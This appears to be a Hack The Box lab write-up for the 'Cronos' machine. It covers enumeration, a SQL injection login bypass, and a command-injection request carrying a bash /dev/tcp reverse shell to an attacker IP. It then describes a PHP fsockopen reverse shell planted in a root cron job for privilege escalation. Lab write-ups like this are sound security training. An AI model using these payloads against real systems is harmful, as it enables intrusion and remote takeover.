## HTB Cronos
**Linux** - **Medium**

---

## Engagement Overview
**Target:Cronos**   
**Box IP:10.10.10.13**   
**Local IP:10.10.14.10** 
**Date:2025-07-12**

---

### Objectives
- Compromise root crontab
- SQL injection vuln

---

### Service Enumeration

- nmap:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- gobuster:
Nothing of use

- DNS:
`cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb`

- SQL injection
Bypassed login @ admin.cronos.htb:
' or 1=1-- -


PING 10.10.14.10 (10.10.14.10) 56(84) bytes of data.
64 bytes from 10.10.14.10: icmp_seq=1 ttl=63 time=43.6 ms

--- 10.10.14.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.662/43.662/43.662/0.000 ms

**Burp Suite repeater**
command=ls -l&host=/var/www
drwxr-xr-x  2 www-data www-data 4096 May 10  2022 admin<br>
drwxr-xr-x  2 www-data www-data 4096 May 10  2022 html<br>
drwxr-xr-x 13 www-data www-data 4096 May 10  2022 laravel<br>

---
## Methodologies

### Initial Access –

**Vulnerability:**  
SQL injection


**Tools & Payloads Used:**
- Burp Suite command injection:
- command=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.24/443+0>%261'%26host=

**Penetration Result:**  
Shell access via command injection

---

## Privilege Escalation

- Cron job:
`* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1`
* Poison injection
```
$sock=fsockopen("10.10.14.10", 443);
exec("/bin/sh -i <&3 >&3 2>&3");
```

---

## House Cleaning

- Removed linpeas.sh and modifications to artisan cron job
- Exploit did not require uploads beyond shell payload

---

## Post-Exploitation

### Credentials & Flags

- `user.txt`: `e053208bdfc3ad87d7d492285a15512a`  
- `root.txt`: `d800ebbbb59fee6c01e6e2f208e41416`

---

## Tools Utilized

* Burp Suite
* linPEAS

---

## Key Takeaways

* linPEAS reported a ton of other vulns but, would be a nightmare to compile them
* New to SQL injection attacks and modifying cron jobs so this was a good experience
